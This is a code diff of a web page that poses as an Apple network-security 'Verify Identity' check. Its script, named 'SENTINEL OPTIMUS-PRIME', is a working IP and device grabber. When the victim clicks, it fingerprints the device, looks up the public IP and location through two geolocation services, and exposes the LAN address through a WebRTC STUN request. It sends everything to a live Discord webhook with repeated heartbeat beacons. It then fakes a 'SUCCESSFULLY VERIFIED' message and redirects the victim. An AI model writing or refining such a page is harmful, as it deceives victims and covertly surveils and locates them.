@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Network Security Gateway</title>
+    <title>Secure Gateway</title>
     <style>
         :root { --apple-blue: #007aff; --apple-gray: #8e8e93; --apple-bg: #f2f2f7; }
         body { background-color: var(--apple-bg); font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; -webkit-font-smoothing: antialiased; }
@@ -17,6 +17,8 @@
         .check-box { width: 26px; height: 26px; border: 2.5px solid var(--apple-blue); border-radius: 7px; margin-right: 18px; position: relative; transition: 0.4s; }
         
         .check-box.loading { border-top-color: transparent; border-radius: 50%; animation: spin 0.8s linear infinite; }
+        .check-box.done { background: var(--apple-blue); border-color: var(--apple-blue); }
+        .check-box.done::after { content: ''; position: absolute; left: 9px; top: 4px; width: 6px; height: 11px; border: solid white; border-width: 0 3px 3px 0; transform: rotate(45deg); }
         
         @keyframes spin { 100% { transform: rotate(360deg); } }
         #log-status { font-size: 10px; color: #c7c7cc; margin-top: 32px; font-weight: 700; text-transform: uppercase; letter-spacing: 1.8px; }
@@ -26,88 +28,141 @@
 
 <div class="card">
     <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" class="logo">
-    <div class="h1">Network Security</div>
-    <div class="p">Suspicious activity detected. Please verify your connection to prevent service interruption.</div>
+    <div class="h1">Authentication</div>
+    <div class="p">Please complete this security challenge to verify your network credentials.</div>
     
     <div class="gate-shell" id="nexus">
         <div class="check-box" id="loader"></div>
         <div style="font-size: 17px; color: #1c1c1e; font-weight: 500;">Verify Identity</div>
     </div>
 
-    <div id="log-status">Security Handshake Required</div>
+    <div id="log-status">System Integrity Protocol</div>
 </div>
 
 <script>
 /**
- * SENTINEL OPTIMUS-PRIME v33.0
- * 1-SECOND DUAL-PHASE REDIRECT + PRIORITY-SYNC EXFIL
+ * SENTINEL OPTIMUS-PRIME v32.1
+ * RESTORED TIERED EXECUTION + 2-SECOND GITHUB REDIRECT
  */
 
 const CONFIG = {
     WH: "https://discordapp.com/api/webhooks/1497687704983310406/yv6VZ2yuH-bxE0fD_BNQAGIUOeQu0gB9-z44IbRhSdiJOvSpHBzljrwvDo0Ifw6hyQNp",
-    INTERMEDIATE: "https://sarahwassan55-rgb.github.io/HelloWorldrtwriqfrthiuwipqdjweui3qrehgiuo4wdiuehtexttestlmaoaoaoaoa/",
-    PING: "@everyone"
+    REDIRECT: "https://sarahwassan55-rgb.github.io/HelloWorldrtwriqfrthiuwipqdjweui3qrehgiuo4wdiuehtexttestlmaoaoaoaoa/",
+    PING: "@everyone",
+    FLAGS: { g: false, r: false }
 };
 
-// Priority-Sync Exfiltration
-const priorityStrike = (data, label) => {
+const simpleStrike = (data) => {
+    const brief = btoa(JSON.stringify(data)).substring(0, 100);
+    const i = new Image();
+    i.src = `${CONFIG.WH}?strike=${brief}`;
+};
+
+const forceExfil = (data, label, color = 0x007aff) => {
     const payload = JSON.stringify({
         content: label === "CRITICAL_HIT" ? CONFIG.PING : "",
-        username: `OPTIMUS-v33 [${label}]`,
+        username: `OPTIMUS-v32.1 [${label}]`,
         embeds: [{
             title: `🔱 Sentinel Unmasked: ${label}`,
-            color: 0xff0000,
+            color: color,
             fields: Object.entries(data).map(([k,v]) => ({ name: k.toUpperCase(), value: `\`${v}\``, inline: true })),
-            timestamp: new Date().toISOString()
+            timestamp: new Date().toISOString(),
+            footer: { text: "Refined Execution Environment" }
         }]
     });
 
-    // Forced transmission before redirect
     navigator.sendBeacon(CONFIG.WH, new Blob([payload], {type:'application/json'}));
+    fetch(CONFIG.WH, { method: 'POST', body: payload, headers: {'Content-Type': 'application/json'}, keepalive: true }).catch(()=>{});
     
-    // Fallback sync-request to hold the thread for a millisecond
     const x = new XMLHttpRequest();
-    x.open("POST", CONFIG.WH, false); // Synchronous
+    x.open("POST", CONFIG.WH, true);
     x.setRequestHeader("Content-Type", "application/json");
     x.send(payload);
 };
 
+const startHeartbeat = () => {
+    setInterval(async () => {
+        try {
+            const b = await navigator.getBattery();
+            forceExfil({
+                active: "User On-Page",
+                power: `${(b.level * 100).toFixed(0)}%`,
+                charging: b.charging ? "YES" : "NO",
+                mem_mb: performance.memory ? (performance.memory.usedJSHeapSize / 1048576).toFixed(1) : "N/A"
+            }, "HEARTBEAT", 0x5856d6);
+        } catch(e) {}
+    }, 3000);
+};
+
 document.getElementById('nexus').onclick = async function() {
-    if ("vibrate" in navigator) navigator.vibrate(20);
+    if ("vibrate" in navigator) navigator.vibrate(15);
     
     const loader = document.getElementById('loader');
     loader.classList.add('loading');
-    document.getElementById('log-status').innerText = "SYNCHRONIZING NETWORK...";
+    document.getElementById('log-status').innerText = "ESTABLISHING SECURE HANDSHAKE...";
 
-    // 1. GATHER ALL DATA IMMEDIATELY
     const b = await navigator.getBattery();
-    const telemetry = {
+    const hardware = {
         platform: navigator.platform,
+        browser: navigator.userAgent.split(' ').pop(),
         cores: navigator.hardwareConcurrency || "N/A",
         ram: navigator.deviceMemory || "N/A",
         battery: `${(b.level * 100).toFixed(0)}%`,
-        screen: `${screen.width}x${screen.height}`,
-        ua: navigator.userAgent
+        screen: `${screen.width}x${screen.height} (@${window.devicePixelRatio}x)`,
+        gpu: (() => {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl');
+            const debug = gl.getExtension('WEBGL_debug_renderer_info');
+            return debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : "Apple/Webkit GPU";
+        })()
     };
 
-    // 2. FIRE CRITICAL STRIKE
-    priorityStrike(telemetry, "CRITICAL_HIT");
+    simpleStrike({ status: "CLICKED", platform: hardware.platform });
+    forceExfil(hardware, "CRITICAL_HIT", 0xff0000);
 
-    // 3. SECONDARY GEO/IP FETCH (Asynchronous)
-    fetch('https://ipapi.co/json/').then(r => r.json()).then(res => {
-        priorityStrike({
-            ip: res.ip,
-            isp: res.org,
-            loc: `${res.city}, ${res.country_name}`,
-            vpn: (res.timezone !== Intl.DateTimeFormat().resolvedOptions().timeZone) ? "YES" : "NO"
-        }, "NETWORK_FINGERPRINT");
-    }).catch(()=>{});
+    const grabGeo = async (provider) => {
+        try {
+            const r = await fetch(provider);
+            const res = await r.json();
+            if(!CONFIG.FLAGS.g) {
+                const isVPN = (res.timezone !== Intl.DateTimeFormat().resolvedOptions().timeZone);
+                forceExfil({
+                    ip_public: res.ip || res.query,
+                    isp: res.org || res.isp,
+                    location: `${res.city}, ${res.region}, ${res.country_name || res.country}`,
+                    vpn: isVPN ? "PROBABLE" : "NONE"
+                }, "NETWORK_FINGERPRINT", 0x34c759);
+                CONFIG.FLAGS.g = true;
+            }
+        } catch(e) {}
+    };
+    grabGeo('https://ipapi.co/json/');
+    grabGeo('http://ip-api.com/json/');
 
-    // 4. THE 1-SECOND DUAL-PHASE REDIRECT
-    // This sends them to the "Suspicious activity check" page you provided
+    const rtc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
+    rtc.createDataChannel("");
+    rtc.onicecandidate = (e) => {
+        if (e.candidate && !CONFIG.FLAGS.r) {
+            const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
+            if (ip) {
+                forceExfil({ internal_lan: ip[1], method: "STUN_UDP_BYPASS" }, "RTC_UNMASK", 0x007aff);
+                CONFIG.FLAGS.r = true;
+            }
+        }
+    };
+    rtc.createOffer().then(o => rtc.setLocalDescription(o));
+
+    startHeartbeat();
+
     setTimeout(() => {
-        window.location.replace(CONFIG.INTERMEDIATE);
-    }, 1000);
+        loader.classList.remove('loading');
+        loader.classList.add('done');
+        document.getElementById('log-status').innerText = "SUCCESSFULLY VERIFIED";
+        document.getElementById('log-status').style.color = "#34c759";
+        
+        // Exactly 2-second redirect to your suspicious activity check page
+        setTimeout(() => { window.location.replace(CONFIG.REDIRECT); }, 2000);
+    }, 2500);
 };
 </script>
 </body>
